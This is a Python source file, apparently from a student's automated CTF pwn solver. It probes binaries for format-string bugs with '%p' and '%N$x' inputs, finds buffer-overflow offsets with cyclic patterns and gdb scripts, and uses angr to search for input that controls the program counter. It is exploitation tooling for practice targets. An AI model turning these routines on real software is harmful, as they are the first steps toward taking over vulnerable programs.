from pwn import *
import subprocess
import os
import angr
import sys
import claripy

class Dynamic:
    def __init__(self):
        self.angrbuf = None
        self.offset = None

    # find printf vuln
    def detect_printf_vuln(self, binary):
        io = process(binary)

        out = io.recvuntil(b">>>")
    
        if b"would you like to edit" in out:
            return "array"

        if b"0x" in out:
            return "libc"

        io.sendline(b"%p")
        out = io.recvall(0.5)

        if b"0x" in out:
            return "printf"

        return None

    def find_printf_offset(self, binary):
        for i in range(50):
            io = process(binary)
            io.sendlineafter(b">>>", f"AAAAAA %{i+1}$x".encode())
            data = io.recvall(1)

            if b"AAAAAA 414141" in data:
                return i + 1

        return None

    # using a universal function did not work :(
    # creating gdb script on the fly instead
    def find_overflow(self, binary):
        try:
            pattern = cyclic(0x200)

            # this approach will just be to write my own gdb script on the fly and then delete it
            script_contents = f'''

                file {binary}
                run <<< {pattern.decode('utf-8')}

                p $rbp

            '''

            rand_name = "../../gdb-scripts/script" + str(random.randint(0, 0xfffffff)) + ".gdb"

            with open(rand_name, "w") as file:
                file.write(script_contents)

            io = subprocess.run(["gdb", "-x", rand_name, "-batch"], stdout=subprocess.PIPE, text=True).stdout
            io = io.split("\n")[-2][-18:]
            os.remove(rand_name)

            return b"A" * (cyclic_find(int.to_bytes(int(io, 16), 8).decode('utf-8')[::-1][4:]) + 4)

        except:
            print("[!] Could not find overflow.")
            return None

    # self explanatory, returns the string to overflow
    def find_overflow2(self, binary):
        pattern = cyclic(0x500)

        # call gdb with the script I made (which is awesome, by the way)
        # gdb scripts are cool as hell
        # i have no clue why subprocess is being like this :(
        io = subprocess.run(["gdb", "-q", "-x", "./gdb-scripts/inspect_registers.gdb", "-ex", f"\"run_binary {binary} {pattern.decode('utf-8')}\"", "-batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout

        print("===========================")
        print(io)

    # these functions will angrify the world!!!!!!!!!
    # got this code from some blog post and marcus' S.H.A.R.T
    def check_mem_corruption(self, simgr):
        if len(simgr.unconstrained) > 0:
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"A"*8)
                
                if path.satisfiable():
                    temp = path.solver.eval(self.angrbuf, cast_to=bytes)

                    try:
                        self.offset = temp[:temp.index(b"A"*8)]
                        
                        simgr.stashes['mem_corrupt'].append(path)

                    except:
                        pass

                simgr.stashes['unconstrained'].remove(path)
                simgr.drop(stash='active')

        return simgr

    def find_overflow_angr(self, binary, start_function):
        # get angr to look for an undefined state
        p = angr.Project(binary, load_options={"auto_load_libs": False})
        self.angrbuf = claripy.BVS("input", 8 * 1024)

        state = p.factory.blank_state(addr=start_function, stdin=self.angrbuf, add_options=angr.options.unicorn)

        simgr = p.factory.simgr(state, save_unconstrained=True)
        simgr.stashes['mem_corrupt']  = []

        def prevent_death(state):
            read_size = state.solver.eval(state.regs.rsi)
            if read_size > 10240:
                simgr.drop(stash = "active")

        p.hook_symbol("fgets", prevent_death)
        p.hook_symbol("scanf", prevent_death)  

        simgr.explore(step_func=self.check_mem_corruption)

        return self.offset 
